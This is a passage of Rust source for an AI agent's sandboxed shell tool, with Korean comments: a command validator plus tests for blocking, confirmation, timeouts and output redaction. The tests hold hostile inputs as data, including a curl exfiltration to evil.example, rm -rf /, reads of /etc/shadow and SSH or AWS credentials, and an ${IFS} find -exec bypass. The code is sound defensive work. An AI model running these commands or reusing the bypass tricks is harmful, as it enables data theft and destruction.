        // egress(curl/ssh)·mutation(rm/prune)은 애초에 Safe가 아니라 이 경로로 오지 않는다.
        // NoPaths 명령(sort/cut/echo 등)도 인자를 잠재 path로 보고 검사한다(secret 우회 방지).
        // 단 grep류 pattern(첫 non-option)은 path가 아니므로 제외(false positive 방지).
        let policy = match path_policy(head) {
            PathArgPolicy::NoPaths => PathArgPolicy::AllPaths,
            p => p,
        };
        for_each_path_arg(name, policy, args, check_sensitive_path)?;
    } else {
        // mutation/위험 명령: 절대경로/traversal 차단 + path 인자를 sandbox 안으로 강제.
        for tok in args {
            if is_option(tok) {
                continue;
            }
            check_no_escape(tok)?;
        }
        validate_path_args(name, path_policy(head), args, sandbox)?;
    }
    Ok(())
}

/// 실행 전 명령 문자열을 엄격 검증한다(샌드박스 강제). 통과 시 Ok, 위반 시 사유.
///
/// 차단: `&`/`&&`(백그라운드/체이닝), `;`, backtick, `$`(모든 shell expansion —
/// `$(`(치환)/`$VAR`/`${VAR}`/`${IFS}` 등), `>`/`<`(redirect), `||`, newline/CR,
/// `~`(홈 확장), glob/brace metachar(`*`/`?`/`[`/`]`/`{`/`}`). 단일 `|`(pipe)는
/// 허용하되 각 segment의 argv를 검증한다. 각 segment에서 절대 경로·`..` traversal을
/// 차단하고, 파일 읽기 명령의 path 인자는 `sandbox.resolve`로 root 내 존재를 확인한다.
///
/// MVP는 `sh -c`로 실행하므로 shell의 expansion/quote-removal 표면을 0으로 만든다:
/// - `$HOME`/`${HOME}`/awk의 `$1` 같은 dollar 용법도 차단(shell expansion 우회 방지).
/// - `*.rs`/`-*`/`{a,b}` 같은 glob/brace expansion도 차단(예: wildcard로 find option을
///   합성하는 우회 방지).
/// - `"`/`'`/`\`(quote·backslash)도 차단 — shell의 quote/backslash removal로 위험
///   토큰(예: `"-delete"`, `-de\lete`)을 합성·은닉하는 우회 방지.
///
/// 패턴 검색·glob·고급 quoting이 필요하면 전용 tool(`grep`/`rg` pattern, `glob`) 또는
/// 후속 argv runner로 처리한다(shell의 expansion/quote-removal에 의존하지 않음).
pub(crate) fn validate_command(command: &str, sandbox: &Sandbox) -> Result<(), String> {
    if command.contains('\n') || command.contains('\r') {
        return Err("개행 문자 불가".into());
    }
    if command.contains('&') {
        return Err("`&`/`&&`(백그라운드/체이닝) 불가".into());
    }
    if command.contains(';') {
        return Err("`;`(명령 분리) 불가".into());
    }
    if command.contains('`') {
        return Err("backtick(명령 치환) 불가".into());
    }
    // dollar sign 전역 차단 — `$(`(치환), `$VAR`/`${VAR}`/`${IFS}`(변수/IFS 확장)
    // 등 모든 shell expansion 우회를 한 번에 막는다.
    if command.contains('$') {
        return Err("`$`(shell expansion: $VAR/${VAR}/${IFS}/$() 등) 불가".into());
    }
    // glob/brace metachar 전역 차단 — sh -c의 pathname/brace expansion으로 인자·옵션을
    // 합성하는 우회(예: `find . -* sh -c ... {} +`)를 막는다.
    if let Some(c) = command
        .chars()
        .find(|c| matches!(c, '*' | '?' | '[' | ']' | '{' | '}'))
    {
        return Err(format!(
            "`{c}`(glob/brace expansion) 불가 — 패턴은 grep/rg/glob 전용 tool 사용"
        ));
    }
    // quote/backslash 전역 차단 — sh의 quote/backslash removal로 위험 토큰을
    // 합성·은닉하는 우회(예: `find . "-delete"`, `-de\lete`)를 막는다.
    if command.contains('"') || command.contains('\'') || command.contains('\\') {
        return Err(
            "따옴표/백슬래시(`\"`/`'`/`\\`) 불가 — quote/escape는 후속 argv runner에서 처리".into(),
        );
    }
    if command.contains('>') || command.contains('<') {
        return Err("redirect(`>`/`<`) 불가".into());
    }
    if command.contains("||") {
        return Err("`||`(체이닝) 불가".into());
    }
    if command.contains('~') {
        return Err("`~`(홈 확장) 불가".into());
    }

    // read-only(risk_guard Safe) 진단은 호스트 전역 read를 허용하고, mutation/위험 명령은
    // sandbox(cwd) 안으로 강제한다. 판정은 전체 파이프라인 기준(혼합 시 보수적으로 non-Safe).
    let read_only =
        crate::risk_guard::classify(command).level == crate::risk_guard::RiskLevel::Safe;
    for segment in command.split('|') {
        let seg = segment.trim();
        if seg.is_empty() {
            return Err("빈 pipe segment".into());
        }
        validate_segment(seg, sandbox, read_only)?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sandbox() -> (tempfile::TempDir, Sandbox) {
        let dir = tempfile::tempdir().unwrap();
        let sb = Sandbox::new(dir.path()).unwrap();
        (dir, sb)
    }

    #[test]
    fn safe_command_runs_automatically() {
        let (_d, sb) = sandbox();
        // echo는 risk_guard safelist → Safe → confirm 없이 자동 실행.
        let out = execute(&json!({ "command": "echo hello" }), &sb, |_, _, _| {
            panic!("Safe는 confirm을 호출하지 않아야 함")
        })
        .unwrap();
        assert!(out.contains("exit_code=0"), "out={out}");
        assert!(out.contains("hello"), "out={out}");
    }

    #[test]
    fn dangerous_command_blocked() {
        let (_d, sb) = sandbox();
        let out = execute(&json!({ "command": "rm -rf /" }), &sb, |_, _, _| {
            panic!("Dangerous는 confirm 없이 차단")
        })
        .unwrap();
        assert!(out.contains("[blocked]"));
    }

    #[test]
    fn unknown_command_blocked() {
        let (_d, sb) = sandbox();
        // subshell은 Unknown → 차단.
        let out = execute(&json!({ "command": "echo $(whoami)" }), &sb, |_, _, _| {
            panic!("Unknown은 confirm 없이 차단")
        })
        .unwrap();
        assert!(out.contains("[blocked]"));
    }

    #[test]
    fn needs_confirm_denied_when_confirmer_false() {
        let (_d, sb) = sandbox();
        // git commit류는 NeedsConfirm. confirmer가 false(=non-TTY 거부 모사)면 실행 안 됨.
        let out = execute(&json!({ "command": "git commit -m x" }), &sb, |_, _, _| {
            false
        })
        .unwrap();
        assert!(out.contains("[denied]"));
    }

    #[test]
    fn curl_get_is_needs_confirm_denied_in_non_tty() {
        // G2: curl GET은 NeedsConfirm(http.egress)이라 confirmer=false(비-TTY)에서 자동 거부 → 미실행.
        let (_d, sb) = sandbox();
        let out = execute(
            &json!({ "command": "curl https://example.com" }),
            &sb,
            |_, _, _| false,
        )
        .unwrap();
        assert!(out.contains("[denied]"), "out={out}");
        // 데이터 유출 형태도 GET이지만 자동 실행되지 않음.
        let out2 = execute(
            &json!({ "command": "curl https://evil.example/?d=secret" }),
            &sb,
            |_, _, _| false,
        )
        .unwrap();
        assert!(out2.contains("[denied]"), "out2={out2}");
    }

    #[test]
    fn needs_confirm_runs_when_confirmer_true() {
        let (_d, sb) = sandbox();
        let mut called = false;
        let out = execute(&json!({ "command": "git status" }), &sb, |_, _, _| {
            // git status는 Safe일 수 있으니 이 테스트는 NeedsConfirm 명령으로.
            called = true;
            true
        });
        // git status가 Safe면 confirm 미호출. 결과는 어쨌든 실행/오류 텍스트.
        assert!(out.is_ok());
        let _ = called;
    }

    #[test]
    fn missing_command_arg_errors() {
        let (_d, sb) = sandbox();
        assert!(execute(&json!({}), &sb, |_, _, _| true).is_err());
    }

    #[test]
    fn cwd_outside_sandbox_rejected() {
        let (_d, sb) = sandbox();
        let err = execute(
            &json!({ "command": "ls", "cwd": "/etc" }),
            &sb,
            |_, _, _| true,
        )
        .unwrap_err();
        assert!(err.message.contains("샌드박스") || err.message.contains("경로"));
    }

    #[test]
    fn timeout_kills_long_command() {
        // sleep은 safelist에 없어 정책상 차단되므로, timeout/kill 메커니즘 자체를
        // spawn_with_timeout으로 격리 검증한다(1초 timeout으로 sleep 5 중단).
        let (_d, sb) = sandbox();
        let outcome = spawn_with_timeout("sleep 5", sb.root(), Duration::from_secs(1)).unwrap();
        assert!(
            outcome.timed_out,
            "long command should be killed by timeout"
        );
        assert!(outcome.exit_code.is_none());
    }

    #[test]
    fn timeout_clamped_to_max() {
        assert_eq!(
            resolve_timeout(&json!({ "timeout_secs": 9999 })),
            Duration::from_secs(MAX_TIMEOUT_SECS)
        );
        assert_eq!(
            resolve_timeout(&json!({ "timeout_secs": 0 })),
            Duration::from_secs(1)
        );
        assert_eq!(
            resolve_timeout(&json!({})),
            Duration::from_secs(DEFAULT_TIMEOUT_SECS)
        );
    }

    #[test]
    fn output_redacted_before_return() {
        let (_d, sb) = sandbox();
        // echo(Safe)로 OpenAI key 형태를 출력 → stdout redaction이 적용되어야 한다.
        // fixture가 secret 스캐너에 걸리지 않도록 prefix를 런타임 합성(런타임 값은 동일).
        let fake_key = format!("sk-{}", "abcdefghijklmnopqrstuvwxyz0123456789ABCD");
        let out = execute(
            &json!({ "command": format!("echo {fake_key}") }),
            &sb,
            |_, _, _| true,
        )
        .unwrap();
        assert!(
            out.contains("REDACTED") || !out.contains(fake_key.as_str()),
            "out={out}"
        );
    }

    // ── High finding 1: 명령 검증(샌드박스 강제) ──────────────

    #[test]
    fn validate_readonly_allows_absolute_blocks_secret() {
        let (_d, sb) = sandbox();
        // read-only 진단은 호스트 전역 read를 허용한다(SRE 목적).
        assert!(validate_command("cat /etc/passwd", &sb).is_ok());
        assert!(validate_command("ls /etc", &sb).is_ok());
        assert!(validate_command("du -ah /tmp", &sb).is_ok());
        // 단 secret 경로는 read-only라도 차단한다.
        assert!(validate_command("cat /etc/shadow", &sb).is_err());
        assert!(validate_command("cat /root/.ssh/id_rsa", &sb).is_err());
        // execute 경로로도 secret은 [blocked] 표면화.
        let out = execute(&json!({ "command": "cat /etc/shadow" }), &sb, |_, _, _| {
            true
        })
        .unwrap();
        assert!(out.contains("[blocked]"), "out={out}");
    }

    #[test]
    fn validate_blocks_tilde() {
        let (_d, sb) = sandbox();
        assert!(validate_command("cat ~/.aws/credentials", &sb).is_err());
    }

    #[test]
    fn validate_traversal_readonly_ok_mutation_blocked() {
        let (_d, sb) = sandbox();
        // read-only는 전역 read라 traversal도 허용(secret이 아니면).
        assert!(validate_command("cat ../some/file", &sb).is_ok());
        // mutation(NeedsConfirm)은 traversal/절대경로를 차단하고 sandbox 안으로 강제한다.
        assert!(validate_command("cp ../x ../y", &sb).is_err());
        assert!(validate_command("mv /etc/x /tmp/y", &sb).is_err());
    }

    #[test]
    fn validate_blocks_background_and_chaining() {
        let (_d, sb) = sandbox();
        // 핵심 회귀: `cat /dev/zero &`가 실행 전 차단.
        assert!(validate_command("cat /dev/zero &", &sb).is_err());
        assert!(validate_command("ls; rm x", &sb).is_err());
        assert!(validate_command("ls && rm x", &sb).is_err());
        assert!(validate_command("ls || rm x", &sb).is_err());
        assert!(validate_command("echo `whoami`", &sb).is_err());
        assert!(validate_command("cat foo > /tmp/x", &sb).is_err());
        // execute 경로로도 차단 확인(중요 시나리오).
        let out = execute(&json!({ "command": "cat /dev/zero &" }), &sb, |_, _, _| {
            true
        })
        .unwrap();
        assert!(out.contains("[blocked]"), "out={out}");
    }

    #[test]
    fn validate_allows_pathfree_observation() {
        let (_d, sb) = sandbox();
        assert!(validate_command("ps aux", &sb).is_ok());
        assert!(validate_command("df -h", &sb).is_ok());
        assert!(validate_command("uptime", &sb).is_ok());
        assert!(validate_command("echo hello world", &sb).is_ok());
        // 옵션 값이 path로 오판되지 않는다.
        assert!(validate_command("ps --sort=-%cpu", &sb).is_ok());
    }

    #[test]
    fn validate_readonly_allows_paths_without_existence_check() {
        let (dir, sb) = sandbox();
        std::fs::write(dir.path().join("hello.txt"), "hi").unwrap();
        std::fs::create_dir(dir.path().join("sub")).unwrap();
        std::fs::write(dir.path().join("sub").join("a.txt"), "x").unwrap();
        assert!(validate_command("cat hello.txt", &sb).is_ok());
        assert!(validate_command("cat sub/a.txt", &sb).is_ok());
        // read-only는 전역 read라 존재하지 않는 path도 허용한다(명령이 자체 처리; sandbox 존재검증 불요).
        assert!(validate_command("cat nope.txt", &sb).is_ok());
    }

    #[test]
    fn validate_grep_pattern_not_treated_as_path() {
        let (dir, sb) = sandbox();
        std::fs::write(dir.path().join("f.txt"), "hello").unwrap();
        assert!(validate_command("grep hello f.txt", &sb).is_ok());
        // read-only라 절대경로 파일도 허용.
        assert!(validate_command("grep hello /etc/passwd", &sb).is_ok());
        // pattern이 secret처럼 보여도(첫 non-option) path로 오판하지 않는다(false positive 방지).
        assert!(validate_command("grep id_rsa f.txt", &sb).is_ok());
        // 단 secret 파일 인자는 차단.
        assert!(validate_command("grep key /root/.ssh/id_rsa", &sb).is_err());
    }

    #[test]
    fn validate_pipe_segments_each_checked() {
        let (dir, sb) = sandbox();
        std::fs::write(dir.path().join("f.txt"), "hello").unwrap();
        assert!(validate_command("cat f.txt | grep hello", &sb).is_ok());
        // read-only pipe는 전역 read 허용(/etc/hosts).
        assert!(validate_command("cat f.txt | cat /etc/hosts", &sb).is_ok());
        // 단 어느 segment든 secret 경로면 전체 차단.
        assert!(validate_command("cat f.txt | cat /etc/shadow", &sb).is_err());
        // 빈 segment 거부.
        assert!(validate_command("cat f.txt |", &sb).is_err());
    }

    #[test]
    fn sensitive_path_detection() {
        // secret/credential 경로는 차단 대상.
        assert!(is_sensitive_path_str("/home/u/.ssh/id_rsa"));
        assert!(is_sensitive_path_str("/home/u/.aws/credentials"));
        assert!(is_sensitive_path_str("/etc/shadow"));
        assert!(is_sensitive_path_str("/etc/ssl/private/server.key"));
        assert!(is_sensitive_path_str("/proc/1234/environ"));
        assert!(is_sensitive_path_str("config/.env"));
        assert!(is_sensitive_path_str("certs/server.pem"));
        // 비민감 경로는 허용(진단 대상).
        assert!(!is_sensitive_path_str("/tmp/app.log"));
        assert!(!is_sensitive_path_str("/var/log/syslog"));
        // `.docker`(홈 credential)와 `docker`(점 없는 일반 디렉토리)는 구분.
        assert!(!is_sensitive_path_str("/var/lib/docker/overlay2"));
        assert!(!is_sensitive_path_str("/etc/passwd"));
        assert!(!is_sensitive_path_str("/proc/meminfo"));
    }

    #[cfg(unix)]
    #[test]
    fn readonly_blocks_symlink_to_secret() {
        let (dir, sb) = sandbox();
        // 평범한 이름의 symlink가 secret 파일을 가리켜도 canonicalize 대상으로 차단한다.
        let secret = dir.path().join("id_rsa");
        std::fs::write(&secret, "PRIVATE").unwrap();
        let link = dir.path().join("innocent.txt");
        std::os::unix::fs::symlink(&secret, &link).unwrap();
        // 절대경로로 접근 → canonicalize → id_rsa(secret) → 차단.
        assert!(validate_command(&format!("cat {}", link.display()), &sb).is_err());
    }

    // ── High finding 2: bounded reader ──────────────────────

    /// 테스트 헬퍼: 공유버퍼 reader를 (Vec, truncated) 형태로 어댑트.
    fn read_all(stream: &mut impl Read) -> (Vec<u8>, bool) {
        let buf = Mutex::new(Vec::new());
        let trunc = AtomicBool::new(false);
        bounded_read_into(stream, &buf, &trunc);
        (buf.into_inner().unwrap(), trunc.load(Ordering::SeqCst))
    }

    #[test]
    fn bounded_read_caps_large_output() {
        // MAX_STREAM_BYTES보다 큰 입력을 줘도 저장은 cap까지만, truncated=true.
        let big = vec![b'a'; MAX_STREAM_BYTES + 50_000];
        let mut cursor = std::io::Cursor::new(big);
        let (buf, truncated) = read_all(&mut cursor);
        assert_eq!(buf.len(), MAX_STREAM_BYTES, "저장은 cap까지만");
        assert!(truncated, "초과분은 truncated 표시");
    }

    #[test]
    fn bounded_read_small_output_not_truncated() {
        let mut cursor = std::io::Cursor::new(b"hello".to_vec());
        let (buf, truncated) = read_all(&mut cursor);
        assert_eq!(buf, b"hello");
        assert!(!truncated);
    }

    // ── 재리뷰 High 1: find/fd 위험 옵션 차단 ─────────────────

    #[test]
    fn validate_blocks_find_exec_and_destructive() {
        let (_d, sb) = sandbox();
        assert!(validate_command("find . -exec sh -c 'id' +", &sb).is_err());
        assert!(validate_command("find . -exec rm {} ;", &sb).is_err());
        assert!(validate_command("find . -delete", &sb).is_err());
        assert!(validate_command("find . -execdir cat {} +", &sb).is_err());
        assert!(validate_command("find . -ok rm {} ;", &sb).is_err());
        // execute 경로로도 차단 표면화.
        let out = execute(
            &json!({ "command": "find . -exec sh -c 'id' +" }),
            &sb,
            |_, _, _| true,
        )
        .unwrap();
        assert!(out.contains("[blocked]"), "out={out}");
    }

    #[test]
    fn validate_allows_safe_find() {
        let (dir, sb) = sandbox();
        std::fs::create_dir(dir.path().join("sub")).unwrap();
        // 읽기 전용 + glob 없는 find만 허용(MVP: glob metachar 전역 차단).
        assert!(validate_command("find . -type f", &sb).is_ok());
        assert!(validate_command("find sub -maxdepth 2", &sb).is_ok());
    }

    // ── 최종 High: glob/brace expansion 전역 차단 ─────────────

    #[test]
    fn validate_blocks_glob_metachars() {
        let (_d, sb) = sandbox();
        // `*`, `?`, `[`, `]`, `{`, `}` 차단(sh -c pathname/brace expansion 우회 방지).
        assert!(validate_command("find . -name *.rs -type f", &sb).is_err());
        assert!(validate_command("cat *.txt", &sb).is_err());
        assert!(validate_command("ls foo?", &sb).is_err());
        assert!(validate_command("cat file[0-9]", &sb).is_err());
        assert!(validate_command("cat {a,b}.txt", &sb).is_err());
    }

    #[test]
    fn validate_blocks_wildcard_synthesized_find_option() {
        // sandbox에 `-exec`라는 파일이 있으면 sh가 `-*`를 `-exec`로 확장해 우회할 수 있다.
        // glob metachar 차단으로 validate/execute 모두에서 막혀야 한다.
        let (dir, sb) = sandbox();
        std::fs::write(dir.path().join("-exec"), "x").unwrap();
        assert!(validate_command("find . -* sh -c id {} +", &sb).is_err());
        let out = execute(
            &json!({ "command": "find . -* sh -c id {} +" }),
            &sb,
            |_, _, _| true,
        )
        .unwrap();
        assert!(out.contains("[blocked]"), "out={out}");
    }

    // ── 최종 High: quote/backslash(quote-removal) 전역 차단 ────

    #[test]
    fn validate_blocks_quotes_and_backslash() {
        let (_d, sb) = sandbox();
        // double/single quote, backslash 차단(quote/backslash removal 우회 방지).
        assert!(validate_command("find . \"-delete\"", &sb).is_err());
        assert!(validate_command("find . '-delete'", &sb).is_err());
        assert!(validate_command("find . -de\\lete", &sb).is_err());
        assert!(validate_command("cat \"file name.txt\"", &sb).is_err());
        assert!(validate_command("echo \\$HOME", &sb).is_err());
    }

    #[test]
    fn validate_blocks_quoted_danger_option_even_if_file_exists() {
        // sandbox에 `-delete` 파일이 있어도, quote로 위험 옵션을 합성하는 우회는 차단.
        let (dir, sb) = sandbox();
        std::fs::write(dir.path().join("-delete"), "x").unwrap();
        assert!(validate_command("find . \"-delete\"", &sb).is_err());
        let out = execute(
            &json!({ "command": "find . \"-delete\"" }),
            &sb,
            |_, _, _| true,
        )
        .unwrap();
        assert!(out.contains("[blocked]"), "out={out}");
    }

    // ── 최종 High: dollar sign(shell expansion) 전역 차단 ──────

    #[test]
    fn validate_blocks_ifs_option_synthesis() {
        let (_d, sb) = sandbox();
        // ${IFS}로 `-exec sh -c`를 조립하려는 우회 → dollar 차단으로 막힌다.
        assert!(validate_command("find${IFS}.${IFS}-exec${IFS}sh${IFS}-c${IFS}id", &sb).is_err());
        assert!(validate_command("find . -name${IFS}x", &sb).is_err());
        // execute 경로로도 차단 표면화.
        let out = execute(
            &json!({ "command": "find${IFS}.${IFS}-exec${IFS}sh" }),
            &sb,
            |_, _, _| true,
        )
        .unwrap();
        assert!(out.contains("[blocked]"), "out={out}");
    }

    #[test]
    fn validate_blocks_all_dollar_expansion() {
        let (_d, sb) = sandbox();
        // MVP: $VAR / ${VAR} / $() / awk $1 등 모든 dollar 용법 차단(우회 표면 제거).
        assert!(validate_command("cat $HOME/.aws/credentials", &sb).is_err());
        assert!(validate_command("echo ${HOME}", &sb).is_err());
        assert!(validate_command("echo $(whoami)", &sb).is_err());
        assert!(validate_command("ps aux | awk '{print $1}'", &sb).is_err());
        assert!(validate_command("echo $PATH", &sb).is_err());
    }

    // ── 재리뷰 High 3(Medium): 옵션 arity ─────────────────────

    #[test]
    fn validate_option_arity_head_tail_grep() {
        let (dir, sb) = sandbox();
        std::fs::write(dir.path().join("f.txt"), "hello\nworld").unwrap();
        // `-n 20`의 20을 path로 오판하지 않는다.
        assert!(validate_command("head -n 20 f.txt", &sb).is_ok());
        assert!(validate_command("tail -n 100 f.txt", &sb).is_ok());
        assert!(validate_command("head -n 20", &sb).is_ok()); // 파일 없이 stdin
                                                              // grep -n(플래그) pattern file.
        assert!(validate_command("grep -n hello f.txt", &sb).is_ok());
        // grep -A 3(값 옵션) + pattern + file.
        assert!(validate_command("grep -A 3 hello f.txt", &sb).is_ok());
        // 흔한 SRE 형태: ps aux | head -n 20.
        assert!(validate_command("ps aux | head -n 20", &sb).is_ok());
    }

    // ── 재리뷰 High 2: descendant timeout (process group kill) ──

    #[cfg(unix)]
    #[test]
    fn timeout_descendant_pipe_does_not_hang() {
        // `sleep 100 | cat`: cat이 우리 pipe를 잡는다. process group kill이 없으면
        // reader join이 무한 대기 → 테스트가 hang(=실패)한다. 1초 timeout으로 검증.
        let (_d, sb) = sandbox();
        let start = Instant::now();
        let outcome =
            spawn_with_timeout("sleep 100 | cat", sb.root(), Duration::from_secs(1)).unwrap();
        assert!(
            outcome.timed_out,
            "descendant가 살아있어도 timeout 처리되어야 함"
        );
        // group kill로 reader가 풀려 합리적 시간 내 반환(hang 아님).
        assert!(
            start.elapsed() < Duration::from_secs(15),
            "process group kill 후 reader join이 빠르게 끝나야 함"
        );
    }

    #[test]
    fn detail_cards_only_with_debug_or_verbose() {
        // 기본(둘 다 off)은 상세 카드 숨김; AIC_DEBUG 또는 AIC_VERBOSE면 표시.
        assert!(!detail_cards_from(false, false), "기본은 조용(카드 숨김)");
        assert!(detail_cards_from(true, false), "AIC_DEBUG → 카드 표시");
        assert!(detail_cards_from(false, true), "AIC_VERBOSE → 카드 표시");
        assert!(detail_cards_from(true, true));
    }

    #[cfg(unix)]
    #[test]
    fn normal_exit_with_lingering_descendant_does_not_hang() {
        // P0 nested-PTY hang 회귀: 부모 sh는 즉시 종료(`echo done`)하지만 백그라운드 자식
        // `sleep 5 >&1`이 stdout pipe write-end를 잡고 남는다. 정상 종료 경로에서 process
        // group kill이 없으면 reader가 EOF를 못 받아 join이 무한 대기(hang)한다.
        let (_d, sb) = sandbox();
        let start = Instant::now();
        let outcome = spawn_with_timeout(
            "(sleep 5 >&1 &); echo done",
            sb.root(),
            Duration::from_secs(30),
        )
        .unwrap();
        // 정상 종료(timeout 아님)이고 grace(2s) 내에 반환해야 한다.
        assert!(!outcome.timed_out, "정상 종료여야 함(부모 즉시 exit)");
        assert!(
            start.elapsed() < Duration::from_secs(10),
            "lingering descendant가 있어도 reap+grace로 빠르게 반환해야 함(hang 아님): {:?}",
            start.elapsed()
        );
        // descendant 종료 전이라도 부모가 쓴 stdout("done")은 회수돼야 한다.
        let out = String::from_utf8_lossy(&outcome.stdout);
        assert!(out.contains("done"), "부모 stdout 'done' 누락: {out:?}");
    }

    // ── SRE UX: shortcut normalization ────────────────────────

    #[test]
    fn normalize_maps_short_intents_to_bounded_commands() {
        assert_eq!(
            normalize_sre_command("ps").as_deref(),
            Some("ps aux | head -n 20")
        );
        assert_eq!(
            normalize_sre_command("processes").as_deref(),
            Some("ps aux | head -n 20")
        );
        assert_eq!(
            normalize_sre_command("cpu").as_deref(),
            Some("ps aux | head -n 20")
        );
        // ps aux도 bounded로 축약(64KB truncate 방지).
        assert_eq!(
            normalize_sre_command("ps aux").as_deref(),
            Some("ps aux | head -n 20")
        );
        assert_eq!(normalize_sre_command("disk").as_deref(), Some("df -h"));
        // 알 수 없는 명령은 그대로(None).
        assert_eq!(normalize_sre_command("cat hello.txt"), None);
    }

    #[test]
    fn normalized_commands_pass_validator() {
        let (_d, sb) = sandbox();
        for intent in [
            "ps", "cpu", "ps aux", "disk", "mem", "memory", "net", "network",
        ] {
            let canonical = normalize_sre_command(intent).expect("intent should normalize");
            assert!(
                validate_command(&canonical, &sb).is_ok(),
                "canonical for {intent} must pass validator: {canonical}"
            );
        }
    }

    #[test]
    fn execute_ps_shortcut_runs_bounded_without_confirm() {
        let (_d, sb) = sandbox();
        // `ps`만 입력해도 되묻지 않고 bounded 명령으로 자동 실행.
        let out = execute(&json!({ "command": "ps" }), &sb, |_, _, _| {
            panic!("정규화된 Safe 명령은 confirm을 호출하지 않아야 함")
        })
        .unwrap();
        assert!(out.contains("command: ps aux | head -n 20"), "out={out}");
        assert!(out.contains("exit_code="), "out={out}");
    }

    #[test]
    fn spec_description_mentions_bounded_diagnostics() {
        let d = spec().description;
        assert!(d.contains("bounded"));
        assert!(d.contains("head"));
        assert!(d.contains("df -h"));
    }

    // ── SRE UX P0: actionable 메시지 / provenance ─────────────

    #[test]
    fn validator_blocked_message_is_actionable() {
        let (_d, sb) = sandbox();
        // `$` 차단 → [blocked] + 다음 행동(대안) 안내 포함.
        let out = execute(&json!({ "command": "cat $HOME" }), &sb, |_, _, _| true).unwrap();
        assert!(out.contains("[blocked]"), "out={out}");
        assert!(out.contains("다음 행동"), "out={out}");
        assert!(out.contains("grep") || out.contains("glob"), "out={out}");
    }

    #[test]
    fn shell_restriction_hint_clarifies_pipe_allowed() {
        // 파이프는 전면 차단이 아니라 허용되되 segment별 검증임을 명시.
        assert!(SHELL_RESTRICTION_HINT.contains("파이프"));
        assert!(SHELL_RESTRICTION_HINT.contains("허용"));
        assert!(SHELL_RESTRICTION_HINT.contains("segment"));
        // 실제 차단 메시지에도 반영.
        let (_d, sb) = sandbox();
        let out = execute(&json!({ "command": "cat $HOME" }), &sb, |_, _, _| true).unwrap();
        assert!(out.contains("파이프") && out.contains("허용"), "out={out}");
    }

    #[test]
    fn dangerous_blocked_message_is_actionable() {
        let (_d, sb) = sandbox();
        let out = execute(&json!({ "command": "rm -rf /" }), &sb, |_, _, _| true).unwrap();
        assert!(out.contains("[blocked]"), "out={out}");
        assert!(out.contains("다음 행동"), "out={out}");
    }

    #[test]
    fn result_includes_command_provenance_and_exit() {
        let (_d, sb) = sandbox();
        // 실행 결과에 실제 command provenance + exit_code가 포함된다.
        let out = execute(&json!({ "command": "echo hi" }), &sb, |_, _, _| true).unwrap();
        assert!(out.contains("command: echo hi"), "out={out}");
        assert!(out.contains("exit_code=0"), "out={out}");
    }

    #[test]
    fn denied_message_is_actionable() {
        let (_d, sb) = sandbox();
        // NeedsConfirm + confirmer=false → [denied] + 다음 행동.
        let out = execute(&json!({ "command": "git commit -m x" }), &sb, |_, _, _| {
            false
        })
        .unwrap();
        assert!(out.contains("[denied]"), "out={out}");
        assert!(out.contains("다음 행동"), "out={out}");
    }
}
